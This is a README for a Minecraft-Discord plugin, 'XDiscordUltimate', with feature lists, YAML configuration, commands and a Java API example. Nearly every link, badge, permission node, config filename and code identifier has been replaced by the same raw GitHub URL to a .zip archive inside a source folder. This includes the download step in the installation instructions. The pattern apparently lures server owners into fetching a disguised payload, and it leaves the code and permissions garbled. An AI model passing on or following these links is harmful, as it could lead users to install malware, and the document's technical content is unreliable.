# XDiscordUltimate

The most comprehensive Discord integration plugin for Minecraft servers, featuring 17+ modules for complete Discord-Minecraft synchronization with modern slash commands, GUI help system, and advanced voice features.

![Version](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
![Minecraft](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
![Discord](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
![License](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)

## 🌟 Features

### Core Features
- **Modern Discord Bot** - Full slash command support with interactive buttons
- **Server Logging** - Log server events, advancements, and all player commands to a single Discord channel.
- **Verification System** - Secure Discord account linking with verification codes
- **GUI Help System** - Interactive in-game help with categorized commands
- **Text-to-Speech Integration** - Voice announcements for Discord voice channels
- **Advanced Admin Console** - Secure Discord-based server management
- **Report & Ticket System** - Complete moderation workflow with Discord integration
- **Multi-Database Support** - SQLite, MySQL, and PostgreSQL
- **PlaceholderAPI Integration** - Full placeholder support
- **LuckPerms Integration** - Permission and group synchronization

### 🎮 New Modern Features

#### **Unified Server Logging**
- **All-in-One Logging** - A single channel for all server logs.
- **Advancement Logging** - Announce when a player earns an advancement.
- **Command Logging** - Log every command a player uses.
- **Ignored Commands** - A configurable list of commands to ignore, reducing spam.
- **Customizable Messages** - Change the format of log messages to your liking.

#### **Interactive GUI Help System**
- **In-Game Help GUI** - Use `/help` to open an interactive help interface
- **Categorized Commands** - Organized by Discord, Reports, Tickets, Voice, and Admin
- **Permission-Aware** - Shows only commands you have access to
- **Click Navigation** - Easy browsing with back buttons and categories
- **Console Fallback** - Text-based help for console users

#### **Modern Discord Bot with Slash Commands**
- **Full Slash Command Support** - Modern Discord interface
- **Interactive Buttons** - Welcome messages with verification buttons
- **Real-time Server Status** - `/status`, `/players`, `/serverinfo` commands
- **Admin Management** - `/console`, `/ban`, `/kick`, `/whitelist` commands
- **Verification Integration** - `/verify` command with code generation
- **Help System** - `/help` command with dynamic content

#### **Enhanced Text-to-Speech System**
- **Voice Channel Integration** - Automatic TTS in Discord voice channels
- **Player Event Announcements** - Join/leave/death notifications
- **Chat Message Reading** - Optional chat-to-voice conversion
- **Discord Message TTS** - Cross-platform voice communication
- **Smart Text Filtering** - Removes formatting, emojis, and URLs
- **Configurable Settings** - Speed, volume, and language options

#### **Advanced Report System**
- **Discord Integration** - Reports sent directly to Discord channels
- **Verification Required** - Only verified players can report
- **Cooldown System** - Prevents spam with configurable cooldowns
- **Rich Embeds** - Professional-looking report notifications
- **Database Logging** - Complete audit trail of all reports

#### **Complete Ticket System**
- **Discord Channel Creation** - Automatic ticket channels
- **Verification Requirements** - Secure ticket creation
- **Ticket Limits** - Configurable maximum open tickets per player
- **Auto-Close System** - Automatic cleanup after inactivity
- **Transcript Generation** - Complete conversation logs
- **Staff Notifications** - Real-time alerts for new tickets

#### **Secure Admin Console**
- **Multi-Layer Security** - Discord ID verification + role checks
- **Real-time Command Execution** - Execute any Minecraft command from Discord
- **Enhanced `/console` Command** - Clean slash command interface
- **Comprehensive Logging** - All admin actions logged
- **Permission Validation** - Multiple security checks

### 📦 Modules

#### 1. **Verification Module**
- Code-based account linking with `/verify` command
- Automatic role assignment in Discord
- Whitelist mode with kick timer
- Custom verification messages
- Real-time verification status checking

#### 2. **Interactive Webhooks & Embeds**
- GUI-based embed builder
- Custom webhook management
- Preview system with live updates
- Template support for common embeds

#### 3. **Voice Channel Integration**
- Proximity voice chat with automatic channel switching
- World-based voice channels
- Auto-channel creation and cleanup
- AFK channel support
- Text-to-speech integration

#### 4. **Server Control**
- Remote server management via Discord
- Slash command interface (`/status`, `/players`, `/serverinfo`)
- Admin command execution (`/console`, `/ban`, `/kick`)
- Server statistics and monitoring
- Secure admin-only commands

#### 5. **Player Events & Feeds**
- Join/leave notifications with TTS
- Death messages with voice announcements
- Achievement announcements
- First join celebrations
- Cross-platform event broadcasting

#### 6. **Admin Alerts & Monitoring**
- Real-time server performance alerts
- TPS and memory usage monitoring
- Suspicious activity detection
- Discord DM notifications for admins
- Configurable alert thresholds

#### 7. **Ticket System**
- Discord-based support tickets with channel creation
- Auto-close inactive tickets after configurable time
- Complete transcript generation
- Staff claiming and assignment system
- Verification-required ticket creation

#### 8. **Cross-Server Communication**
- Global chat system across multiple servers
- Private messaging with Discord fallback
- Server-specific channels
- Mention support and notifications

#### 9. **Mini-Games & Polls**
- Interactive polls with Discord integration
- Trivia games with leaderboards
- Math challenges and word games
- Reaction-based games
- Activity rewards system

#### 10. **Moderation Sync**
- Ban/mute synchronization between platforms
- Warning system with Discord logging
- Complete moderation logs
- Audit trail for all actions

#### 11. **Bot Console**
- Remote console access with secure authentication
- Real-time log streaming
- Command execution with response feedback
- Session management and timeouts

#### 12. **Announcement System**
- Scheduled announcements with Discord sync
- Custom formatting and embeds
- Player-specific targeted messages
- Multi-channel broadcasting

#### 13. **Leaderboards**
- Dynamic leaderboards with auto-updates
- PlaceholderAPI integration
- GUI interface for easy viewing
- Discord channel updates

#### 14. **Emoji Reactions**
- Custom emoji support for events
- Reaction roles and interactive messages
- Emoji GUI for easy selection
- Chat integration with Discord emojis

#### 15. **And More!**
- Automatic update checker
- Comprehensive metrics collection
- Multi-language support
- Extensive configuration options

## 📋 Requirements

- **Minecraft Server**: 1.16.5 - 1.21.8
- **Java**: 17 or higher
- **Discord Bot**: With appropriate permissions and intents
- **Optional Dependencies**:
  - PlaceholderAPI (for placeholders)
  - LuckPerms (for advanced permissions)
  - Vault (for economy features)

## 🚀 Installation

1. **Download** the latest release from [Releases](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
2. **Place** the JAR file in your server's `plugins` folder
3. **Start** your server to generate configuration files
4. **Stop** your server
5. **Configure** the plugin (see Configuration section)
6. **Start** your server again

## ⚙️ Configuration

### Quick Setup

1. **Create Discord Bot**
   ```
   1. Go to https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip
   2. Create New Application
   3. Go to Bot section
   4. Create Bot and copy token
   5. Enable all Privileged Gateway Intents
   6. Add bot to your server with Administrator permissions
   ```

2. **Configure https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip**
   ```yaml
   # Admin Discord IDs - These users have full control
   adminIDs:
     - "123456789012345678"
     - "987654321098765432"
   
   discord:
     bot-token: "YOUR_BOT_TOKEN"
     guild-id: "YOUR_GUILD_ID"
     activity:
       type: "PLAYING"
       text: "Minecraft | !help"
     channels:
       welcome: "YOUR_WELCOME_CHANNEL_ID"
       logs: "YOUR_LOGS_CHANNEL_ID"
       chat: "YOUR_CHAT_CHANNEL_ID"
       console: "YOUR_CONSOLE_CHANNEL_ID"
       events: "YOUR_EVENTS_CHANNEL_ID"
       tickets: "YOUR_TICKETS_CHANNEL_ID"
       moderation: "YOUR_MODERATION_CHANNEL_ID"
   
   database:
     type: "sqlite" # or mysql, postgresql
   
   features:
     verification:
       enabled: true
       kick-after-minutes: 30
     voice-channel:
       enabled: true
       tts:
         enabled: true
         chat-messages: false
         discord-messages: true
         player-events: true
     moderation:
       enabled: true
       report-cooldown-minutes: 5
       require-verification-for-reports: true
     tickets:
       enabled: true
       auto-close-hours: 48
   ```

### Advanced Configuration

#### Server Logging
```yaml
features:
  server-logging:
    enabled: true
    # Discord channel ID for logs (use channel ID, not name)
    logs-channel-id: "YOUR_LOGS_CHANNEL_ID"
    # Log server start/stop events
    log-server-events: true
    # Log player advancements
    log-advancements: true
    # Log commands used by players
    log-commands: true
    # List of commands to IGNORE. Commands listed here will NOT be logged.
    ignored-commands:
      - "afk"
      - "balancetop"
      - "seen"
    # Message formats
    advancement-message: "🏆 **%player%** has made the advancement **[%advancement%]**"
    command-message: "```[%timestamp%] %player% used command: %command%```"
```

#### Text-to-Speech Settings
```yaml
features:
  voice-channel:
    tts:
      enabled: true
      language: "en"
      speed: 1.0
      volume: 0.8
      chat-messages: false      # Read chat messages aloud
      discord-messages: true    # Read Discord messages in voice
      player-events: true       # Announce player join/leave/death
```

#### Report System Settings
```yaml
features:
  moderation:
    enabled: true
    report-cooldown-minutes: 5
    require-verification-for-reports: true
    auto-moderate: true
    filter-words:
      - "badword1"
      - "badword2"
```

#### Ticket System Settings
```yaml
features:
  tickets:
    enabled: true
    ticket-category: "Support Tickets"
    auto-close-hours: 48
    player-close: true
    save-transcript: true
    transcript-channel: "ticket-logs"
```

## 📝 Commands

### Player Commands
- `/verify [username]` - Link your Discord account with verification code
- `/help [category]` - Open interactive help GUI or specific category
- `/report <player> <reason>` - Report a player (requires verification)
- `/support <message>` - Create support ticket (requires verification)
- `/discord` - Show Discord server invite and connection status

### Admin Commands (In-Game)
- `/xdiscord reload` - Reload configuration
- `/xdiscord info` - Show plugin information and status
- `/dconsole` - Toggle Discord console output
- `/help admin` - View admin-specific help (requires admin permission)

### Discord Slash Commands
- `/verify [username]` - Get verification code to link Minecraft account
- `/status` - Check Minecraft server status and player count
- `/players` - List all online players
- `/serverinfo` - Get detailed server information
- `/help` - Show available Discord commands
- `/console <command>` - Execute Minecraft console command (admin only)
- `/ban <player> [reason]` - Ban a player (admin only)
- `/unban <player>` - Unban a player (admin only)
- `/kick <player> [reason]` - Kick a player (admin only)
- `/whitelist <action> [player]` - Manage server whitelist (admin only)

## 🔑 Permissions

### Basic Permissions
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Use verification system
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Report players
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Create support tickets
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Access help system

### Admin Permissions
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Access admin commands and help
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Use Discord console commands
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Bypass verification requirement

### Module-Specific Permissions
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Create custom embeds
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Make server announcements
- `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` - Manage webhooks

## 🎯 New Features Guide

### Using the GUI Help System
1. **In-Game**: Type `/help` to open the interactive GUI
2. **Categories**: Click on different categories to explore commands
3. **Navigation**: Use back buttons to return to main menu
4. **Admin Access**: Admin commands only show if you have permission
5. **Console**: Console users get text-based help automatically

### Discord Bot Slash Commands
1. **Verification**: Use `/verify` in Discord to get a code
2. **Server Status**: Use `/status` to check if server is online
3. **Admin Commands**: Use `/console`, `/ban`, `/kick` if you're an admin
4. **Help**: Use `/help` to see all available commands

### Text-to-Speech Features
1. **Join Voice Channel**: Connect to any Discord voice channel
2. **Automatic Announcements**: Player events are announced automatically
3. **Discord Messages**: Messages from Discord are read in voice channels
4. **Configuration**: Admins can adjust TTS settings in config

### Report System
1. **Verify Account**: Must be verified to report players
2. **Use Command**: `/report <player> <reason>` in-game
3. **Discord Notification**: Reports appear in Discord moderation channel
4. **Cooldown**: 5-minute cooldown between reports (configurable)

### Ticket System
1. **Create Ticket**: Use `/support <message>` in-game
2. **Discord Channel**: Automatic ticket channel created
3. **Staff Response**: Staff can respond in the Discord channel
4. **Auto-Close**: Tickets close automatically after 48 hours of inactivity

## 🔧 PlaceholderAPI Placeholders

- `%xdiscord_verified%` - Shows if player is verified (true/false)
- `%xdiscord_discord_name%` - Player's Discord username
- `%xdiscord_discord_id%` - Player's Discord ID
- `%xdiscord_tickets_open%` - Number of open tickets for player
- `%xdiscord_verification_status%` - Detailed verification status

## 🌐 API Usage

### Maven
```xml
<repository>
    <id>xreatlabs-repo</id>
    <url>https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip</url>
</repository>

<dependency>
    <groupId>https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip</groupId>
    <artifactId>xdiscordultimate</artifactId>
    <version>1.0.0</version>
    <scope>provided</scope>
</dependency>
```

### Example API Usage
```java
XDiscordUltimate api = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip();

// Check if player is verified
boolean isVerified = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().isVerified(player);

// Check if player is admin
boolean isAdmin = https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().isAdmin(player);

// Create a report
https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().createReport(
    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip(), 
    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip(), 
    "Griefing"
).thenAccept(reportId -> {
    // Report created with ID
});

// Create a ticket
https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().createTicket(
    https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip(), 
    "Need help with my base"
).thenAccept(ticketId -> {
    // Ticket created with ID
});

// Send TTS announcement
https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip().getVoiceChannelModule()
    .announceDiscordMessage("Bot", "Server restarting in 5 minutes!");
```

## 🐛 Troubleshooting

### Common Issues

1. **Bot not connecting**
   - Check bot token is correct in https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip
   - Ensure bot has Administrator permissions
   - Verify guild ID is correct
   - Check all Privileged Gateway Intents are enabled

2. **Slash commands not appearing**
   - Bot needs Administrator permission
   - Wait up to 1 hour for global commands to sync
   - Restart Discord client
   - Check bot is online and in your server

3. **Verification not working**
   - Ensure player has `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` permission
   - Check database connection is working
   - Verify Discord bot is online
   - Check console for error messages

4. **TTS not working**
   - Ensure https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip is true
   - Check bot has voice permissions in Discord
   - Verify users are in voice channels
   - Check TTS settings in config

5. **Reports/Tickets not working**
   - Ensure players are verified
   - Check Discord channel IDs in config
   - Verify bot has permissions in channels
   - Check database is properly configured

6. **GUI Help not opening**
   - Ensure player has `https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip` permission
   - Check for plugin conflicts
   - Verify server version compatibility
   - Check console for errors

### Debug Mode
Enable debug mode for detailed logging:
```yaml
general:
  debug: true
```

## 📊 Metrics

This plugin uses bStats to collect anonymous usage data. You can opt-out in the configuration:

```yaml
advanced:
  metrics:
    enabled: false
```

## 🤝 Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Credits

- **Developer**: XReatLabs Team
- **Contributors**: See [contributors](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
- **Libraries Used**:
  - [JDA](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - Discord API
  - [HikariCP](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - Database pooling
  - [OkHttp](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - HTTP client
  - [Gson](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip) - JSON parsing

## 📞 Support

- **Discord**: [Join our Discord](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
- **Wiki**: [GitHub Wiki](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
- **Documentation**: [Full Documentation](https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip)
- **Email**: https://raw.githubusercontent.com/ahmadisoggg/XDiscordUltimate/master/src/main/java/com/xreatlabs/xdiscordultimate/listeners/X_Discord_Ultimate_2.4.zip

## 🔄 Update History

### Version 1.0.0 (Current)
- **Modern Discord Bot**: Full slash command support with interactive buttons
- **GUI Help System**: Interactive in-game help with categorized commands
- **Enhanced TTS**: Voice announcements for Discord voice channels
- **Advanced Reports**: Complete moderation workflow with Discord integration
- **Secure Admin Console**: Multi-layer security for Discord-based server management
- **Complete Ticket System**: Automatic Discord channel creation and management
- **Database Enhancements**: Full CRUD operations for all systems
- **17 Fully Functional Modules**: All features working end-to-end
- **Multi-Version Support**: Compatible with Minecraft 1.16.5-1.21.8
- **Comprehensive API**: Full developer API with examples
- **Complete Documentation**: Detailed setup and usage guides

---

Made with ❤️ by XreatLabs Team
